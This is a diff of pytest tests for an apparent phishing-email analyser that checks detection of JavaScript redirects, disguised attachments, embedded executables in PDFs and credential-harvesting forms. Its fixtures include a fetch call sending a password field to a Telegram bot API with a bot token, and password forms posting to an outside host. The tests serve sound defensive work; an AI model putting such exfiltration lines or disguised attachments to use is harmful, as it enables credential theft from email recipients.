@@ -38,6 +38,26 @@ def test_html_features_iframes_favicon_redirects_endpoints():
     assert "cdn.example.net" in res["external_resource_hosts"]
 
 
+def test_commented_out_js_redirect_is_ignored():
+    html = """<script>
+    // window.location.href = "https://old.example.com/";
+    /* location.replace("https://older.example.com/") */
+    var u = "https://cdn.example.net/x.js"; // keep URLs inside strings
+    </script>"""
+    assert AttachmentParser.parse_html(html, base_url="https://page.example.io/")["js_redirects"] == []
+    live = '<script>var a = 1; // note\nwindow.location.href = "https://land.example.com/";</script>'
+    assert AttachmentParser.parse_html(live, base_url="")["js_redirects"] == ["https://land.example.com/"]
+
+
+def test_html_only_email_text_has_no_css():
+    eml = (b"From: Shop <a@shop.example>\r\nTo: b@example.com\r\nSubject: Order\r\n"
+           b"Content-Type: text/html; charset=utf-8\r\n\r\n"
+           b"<html><head><style>.btn{color:red}</style></head><body><p>Your order is ready</p>"
+           b"<script>var x=1;</script></body></html>")
+    preview = AttachmentParser.parse_eml(eml)["body_text_preview"]
+    assert preview == "Your order is ready"
+
+
 def test_telegram_exfiltration_and_bot_id():
     html = """<script>fetch("https://api.telegram.org/bot7123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw/sendMessage?chat_id=-100123456&text="+p)</script>
               <input type="password" id="p">"""
@@ -169,3 +189,39 @@ def test_real_dataset_eml_if_available():
         res = AttachmentParser.parse_eml(f.read())
     assert res["from_address"] == "kevin@nova.gy" and res["from_domain"] == "nova.gy"
     assert res["reply_to_domain"] == "mail.ru"
+
+
+def _eml_with_attachment(filename: str, ctype: str, payload: bytes) -> bytes:
+    return (b"From: a@b.example\nTo: c@d.example\nSubject: s\nMIME-Version: 1.0\n"
+            b'Content-Type: multipart/mixed; boundary="B"\n\n--B\nContent-Type: text/plain\n\nhi\n'
+            b"--B\nContent-Type: " + ctype.encode() + b'\nContent-Disposition: attachment; filename="' + filename.encode()
+            + b'"\nContent-Transfer-Encoding: base64\n\n' + base64.encodebytes(payload) + b"\n--B--\n")
+
+
+def test_attachment_type_is_sniffed_from_content():
+    form = b'<html><form action="https://x.top/p"><input type="password"></form></html>'
+    item = AttachmentParser.parse_eml(_eml_with_attachment("invoice.pdf", "application/octet-stream", form))["attachments_analysis"][0]
+    assert item["kind"] == "html" and item["has_password_field"] is True
+    exe = AttachmentParser.analyze_attachment("report.pdf", "application/pdf", b"MZ\x90\x00" + b"\x00" * 64)
+    assert exe["is_executable"] is True
+
+
+def test_mht_attachment_is_analysed_as_html():
+    mht = (b'MIME-Version: 1.0\nContent-Type: multipart/related; boundary="M"\n\n--M\n'
+           b"Content-Type: text/html; charset=utf-8\nContent-Location: https://x.example/\n\n"
+           b'<html><body><p>Sign in</p><form action="https://x.top/p"><input type="password"></form></body></html>\n--M--\n')
+    item = AttachmentParser.analyze_attachment("page.mht", "application/octet-stream", mht)
+    assert item["kind"] == "html" and item["has_password_field"] is True and item["text_preview"] == "Sign in"
+
+
+def test_pdf_embedded_executable_is_active_content():
+    fitz = pytest.importorskip("pymupdf")
+    doc = fitz.open()
+    doc.new_page().insert_text((72, 72), "Invoice attached")
+    doc.embfile_add("payload.exe", b"MZ" + b"\x00" * 100, filename="payload.exe")
+    res = AttachmentParser.parse_pdf(doc.tobytes())
+    assert res["embedded_files"] == ["payload.exe"] and res["has_embedded_payload"] is True
+    plain = fitz.open()
+    plain.new_page().insert_text((72, 72), "Invoice")
+    plain.embfile_add("data.csv", b"a,b\n1,2\n", filename="data.csv")
+    assert AttachmentParser.parse_pdf(plain.tobytes())["has_embedded_payload"] is False
